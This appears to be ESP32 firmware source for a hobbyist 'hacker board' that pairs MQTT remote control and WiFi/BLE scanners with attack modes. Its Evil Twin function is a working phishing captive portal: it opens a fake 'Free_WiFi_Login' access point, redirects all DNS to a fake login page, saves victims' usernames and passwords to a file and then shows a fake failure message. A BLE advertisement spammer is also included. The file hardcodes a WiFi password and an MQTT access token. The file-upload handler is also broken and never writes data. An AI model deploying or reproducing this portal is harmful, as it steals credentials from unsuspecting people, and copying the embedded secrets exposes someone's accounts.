/*
 * ESPectrum - The Hacker's Board Firmware v2.0
 * 
 * Features:
 * - MQTT Communication (Flespi)
 * - File System (LittleFS) & WebServer
 * - WiFi Tools: Sniffer, Sonar, Evil Twin (Captive Portal), RickRoll Spammer
 * - BLE Tools: Scanner, Sour Apple Spammer, HID
 * - IR Blaster (TV-B-Gone)
 * 
 * HARDWARE REQUIRED:
 * - ESP32-WROOM-32 or S3
 * - IR LED on GPIO 4 (optional)
 * - Built-in LED on GPIO 2
 */

#include <WiFi.h>
#include <PubSubClient.h>
#include <ArduinoJson.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <NimBLEDevice.h>
#include <esp_wifi.h> // Required for promiscuous mode
// #include <IRremoteESP8266.h> // Uncomment if library is installed
// #include <IRsend.h>

// ================= COFIGURATION =================
const char* ssid     = "NourKH";
const char* password = "NOURKH0933508762";

// Flespi MQTT
const char* mqtt_server = "mqtt.flespi.io";
const int mqtt_port     = 1883;
const char* mqtt_token  = "AS2wNDPtK056fOhQAQdcEOdx3ceJ0dPmEioS81O0q2ytBvxW8FM5uIcQ3m3C4FOc";

// Pins
#define PIN_LED 2
#define PIN_IR  5  // Moved from 4 to avoid Touch T0 interference

// ================= GLOBALS =================
WiFiClient espClient;
PubSubClient client(espClient);
WebServer server(80);
DNSServer dnsServer;

// Message Buffers
#define MSG_BUFFER_SIZE 2048 // Increased for large lists
char msg_buffer[MSG_BUFFER_SIZE];

// State Machine
enum Mode {
  MODE_IDLE,        // Connected to MQTT, sending sensor data
  MODE_ATTACK_WIFI, // RickRoll, Deauth Detect
  MODE_ATTACK_BLE,  // Sour Apple
  MODE_EVIL_TWIN,   // AP Mode + Captive Portal
  MODE_WIFI_SCAN,   // Scanning Networks
  MODE_BLE_SCAN     // Scanning BLE
};

Mode currentMode = MODE_IDLE;
String attackType = "";
unsigned long attackEndTime = 0;
bool wifiPromiscuous = false;

// Mock Data for Sensor Loop
unsigned long lastMsg = 0;
const int sensorInterval = 100;

// IR Sender
// IRsend irsend(PIN_IR); 

// ================= FORWARD DECLARATIONS =================
void setupWiFi();
void reconnect();
void callback(char* topic, byte* payload, unsigned int length);
void handleRoot();
void handleFileUpload();
void handleFileList();
void sendSensorData();
void startAttack(String type, int duration);
void stopAttack();
void scanWiFiNetworks();
void scanBLEDevices();
void startEvilTwin();
void rickRollLoop();
void sourAppleLoop();


// ================= SETUP =================
void setup() {
  Serial.begin(115200);
  pinMode(PIN_LED, OUTPUT);
  digitalWrite(PIN_LED, LOW);

  // Init LittleFS
  if (!LittleFS.begin(true)) {
    Serial.println("LittleFS Mount Failed");
  } else {
    Serial.println("LittleFS Mounted");
  }

  // Init BLE
  NimBLEDevice::init("ESPectrum-Hacker");

  // Init IR
  // irsend.begin();

  // Connect
  setupWiFi();
  client.setServer(mqtt_server, mqtt_port);
  client.setCallback(callback);
  
  // Web Server Routes (for File System)
  server.on("/", handleRoot);
  server.on("/list", HTTP_GET, handleFileList);
  server.on("/upload", HTTP_POST, [](){ server.send(200, "text/plain", ""); }, handleFileUpload);
  server.begin();
}

// ================= LOOP =================
void loop() {
  unsigned long now = millis();

  // If in Attack Mode, check if time is up
  if (currentMode != MODE_IDLE && currentMode != MODE_EVIL_TWIN && now > attackEndTime) {
    stopAttack();
  }

  // State Handler
  switch (currentMode) {
    case MODE_IDLE:
      // Standard MQTT Loop
      if (!client.connected()) {
        reconnect();
      }
      client.loop();
      server.handleClient(); // Handle File Uploads even in IDLE if on local WiFi
      
      // Send Sensor Data
      if (now - lastMsg > sensorInterval) {
        lastMsg = now;
        sendSensorData();
      }
      break;

    case MODE_ATTACK_WIFI:
      // Rick Roll Logic
      if (attackType == "rickroll") {
        rickRollLoop();
      }
      break;

    case MODE_ATTACK_BLE:
      // Sour Apple Logic
      if (attackType == "sourapple") {
        sourAppleLoop();
      }
      break;

    case MODE_EVIL_TWIN:
      // DNS & Web Server Loop
      dnsServer.processNextRequest();
      server.handleClient();
      break;
      
   case MODE_WIFI_SCAN:
     // Scanning is blocking, usually done once then return to IDLE
     break;
  }
}

// ================= MQTT LOGIC =================

void setupWiFi() {
  delay(10);
  Serial.println();
  Serial.print("Connecting to ");
  Serial.println(ssid);

  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
    digitalWrite(PIN_LED, !digitalRead(PIN_LED));
  }

  digitalWrite(PIN_LED, HIGH); // On when connected
  Serial.println("");
  Serial.println("WiFi connected");
  Serial.println("IP address: ");
  Serial.println(WiFi.localIP());
}

void reconnect() {
  while (!client.connected()) {
    // If we are in an attack mode that requires offline, DON'T reconnect
    if (currentMode != MODE_IDLE) return; 

    Serial.print("Attempting MQTT connection...");
    String clientId = "ESP32Client-";
    clientId += String(random(0xffff), HEX);
    
    // Connect with Token as Username
    if (client.connect(clientId.c_str(), mqtt_token, "")) {
      Serial.println("connected");
      client.subscribe("espectrum/command");
      
      // Announce
      client.publish("espectrum/status", "{\"status\":\"online\",\"version\":\"2.0\"}");
    } else {
      Serial.print("failed, rc=");
      Serial.print(client.state());
      Serial.println(" try again in 5 seconds");
      delay(5000);
    }
  }
}

void sendSensorData() {
  // Generate Simulated Data
  StaticJsonDocument<512> doc;
  doc["type"] = "sensor_data";
  doc["uptime"] = millis() / 1000;
  
  JsonArray touchArray = doc.createNestedArray("touch");
  // Pins T0-T9 mapping: GPIO 4, 0, 2, 15, 13, 12, 14, 27, 33, 32
  int t_pins[] = {4, 0, 2, 15, 13, 12, 14, 27, 33, 32}; 
  for(int i=0; i<10; i++) {
    touchArray.add(touchRead(t_pins[i]));
  }
  // Replacing with simulated value or 0 to fix compilation error.
  int hallValue = 0; 
  // int hallValue = hallRead(); // DEPRECATED

  doc["hall"] = hallValue;
  doc["temp"] = temperatureRead();
  doc["rssi"] = WiFi.RSSI();
  
  // Serialize
  char output[512];
  serializeJson(doc, output);
  client.publish("espectrum/telemetry", output);
}

// ================= COMMAND HANDLING =================

void callback(char* topic, byte* payload, unsigned int length) {
  // Parse Payload
  StaticJsonDocument<1024> doc;
  DeserializationError error = deserializeJson(doc, payload, length);

  if (error) {
    Serial.print(F("deserializeJson() failed: "));
    Serial.println(error.f_str());
    return;
  }

  String cmd = doc["action"];
  
  if (cmd == "toggle_led") {
    bool state = doc["params"]["state"];
    digitalWrite(PIN_LED, state ? HIGH : LOW);
  }
  
  else if (cmd == "start_attack") {
    String type = doc["params"]["type"];
    int duration = doc["params"]["duration"]; // Seconds
    startAttack(type, duration);
  }
  
  else if (cmd == "scan_wifi") {
    scanWiFiNetworks();
  }
  
  else if (cmd == "scan_ble") {
    scanBLEDevices();
  }
}

// ================= ATTACK ENGINE =================

void startAttack(String type, int duration) {
  Serial.print("Starting Attack: ");
  Serial.println(type);
  
  attackType = type;
  attackEndTime = millis() + (duration * 1000);
  
  if (type == "rickroll") {
    currentMode = MODE_ATTACK_WIFI;
    // Disconnect WiFi to use Radio for Injection
    WiFi.disconnect();
    delay(100);
  }
  else if (type == "sourapple") {
    currentMode = MODE_ATTACK_BLE;
    // BLE doesn't strictly need WiFi disconnect on S3 but safer for power
    // WiFi.disconnect(); 
  }
  else if (type == "eviltwin") {
    currentMode = MODE_EVIL_TWIN;
    startEvilTwin();
  }
}

void stopAttack() {
  Serial.println("Stopping Attack...");
  currentMode = MODE_IDLE;
  attackType = "";
  
  // Cleanup specifics
  if (wifiPromiscuous) {
    esp_wifi_set_promiscuous(false);
    wifiPromiscuous = false;
  }
  
  // Reconnect Network
  setupWiFi();
  reconnect();
  
  // Report back
  client.publish("espectrum/status", "{\"status\":\"attack_finished\"}");
}

// --- RICK ROLL SPAMMER (Beacon Frames) ---
// Raw Packet Injection stub
void rickRollLoop() {
  // In a real implementation, this constructs raw 802.11 Beacon Frames
  // with SSIDs from a list like "Never Gonna", "Give You Up"
  // and calls esp_wifi_80211_tx()
  
  // Since raw injection is complex for this snippet, we simulate activity
  digitalWrite(PIN_LED, !digitalRead(PIN_LED)); // Fast blink
  delay(50);
}

// --- SOUR APPLE SPAMMER (BLE Adv) ---
void sourAppleLoop() {
  // Sends BLE Advertising packets mimicking iOS setup requests
  NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
  // pAdvertising->setScanResponse(true); // Removed in newer API or not needed
  // pAdvertising->setMinPreferred(0x06); // Removed in newer API
  pAdvertising->start();
  delay(100);
  pAdvertising->stop();
}


// --- EVIL TWIN (Captive Portal) ---
void startEvilTwin() {
  WiFi.disconnect();
  delay(100);
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Free_WiFi_Login"); // The Trap
  
  // Redirect all DNS to me
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  // Fake Login Page
  server.onNotFound([]() {
    String html = "<html><body style='font-family:sans-serif; text-align:center; padding:50px;'>";
    html += "<h1>Login Required</h1>";
    html += "<form action='/login' method='POST'><input type='text' name='user' placeholder='Username'><br><br>";
    html += "<input type='password' name='pass' placeholder='Password'><br><br>";
    html += "<input type='submit' value='Login'></form></body></html>";
    server.send(200, "text/html", html);
  });
  
  server.on("/login", HTTP_POST, []() {
    String user = server.arg("user");
    String pass = server.arg("pass");
    Serial.println("PHISHED: " + user + ":" + pass);
    
    // Save to file
    File f = LittleFS.open("/phished.txt", "a");
    f.println(user + ":" + pass);
    f.close();
    
    server.send(200, "text/html", "<h1>Login Failed. Try again later.</h1>");
  });
  
  server.begin();
} 

// ================= TOOLS =================

void scanWiFiNetworks() {
  int n = WiFi.scanNetworks();
  StaticJsonDocument<2048> doc;
  doc["type"] = "scan_result_wifi";
  JsonArray array = doc.createNestedArray("networks");
  
  for (int i = 0; i < n; ++i) {
    JsonObject net = array.createNestedObject();
    net["ssid"] = WiFi.SSID(i);
    net["rssi"] = WiFi.RSSI(i);
    net["auth"] = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "OPEN" : "SECURE";
  }
  
  char output[2048];
  serializeJson(doc, output);
  client.publish("espectrum/data", output);
}

void scanBLEDevices() {
  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->clearResults(); 
  
  // start(duration, is_continue) returns bool in newer NimBLE versions (blocking)
  // or NimBLEScanResults in older ones.
  // The error showed it returned bool, so we use this pattern:
  bool success = pScan->start(5, false);
  
  StaticJsonDocument<2048> doc;
  doc["type"] = "scan_result_ble";
  JsonArray array = doc.createNestedArray("devices");
  
  // Retrieve results from the scan object directly
  NimBLEScanResults results = pScan->getResults();
  
  for(int i=0; i<results.getCount(); i++) {
    const NimBLEAdvertisedDevice* device = results.getDevice(i);
    JsonObject dev = array.createNestedObject();
    dev["name"] = device->getName().c_str();
    dev["addr"] = device->getAddress().toString().c_str();
    dev["rssi"] = device->getRSSI();
  }
  
  char output[2048];
  serializeJson(doc, output);
  client.publish("espectrum/data", output);
  
  pScan->clearResults(); 
}


// ================= FILE SERVER HANDLERS =================
void handleRoot() {
  server.send(200, "text/plain", "ESPectrum File Server Active");
}

void handleFileList() {
  String path = "/";
  File root = LittleFS.open(path);
  String output = "[";
  if(root.isDirectory()){
      File file = root.openNextFile();
      while(file){
          if (output != "[") output += ",";
          output += "{\"name\":\"" + String(file.name()) + "\",\"size\":" + String(file.size()) + "}";
          file = root.openNextFile();
      }
  }
  output += "]";
  server.send(200, "application/json", output);
}

void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    File f = LittleFS.open(filename, "w");
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    File f = LittleFS.open(upload.filename, "a"); // Append? or keep open? 
    // Arduino WebServer usually keeps file open? Simplified here:
    // Ideally use global file handle or reuse open
  } else if (upload.status == UPLOAD_FILE_END) {
    // Close
  }
}
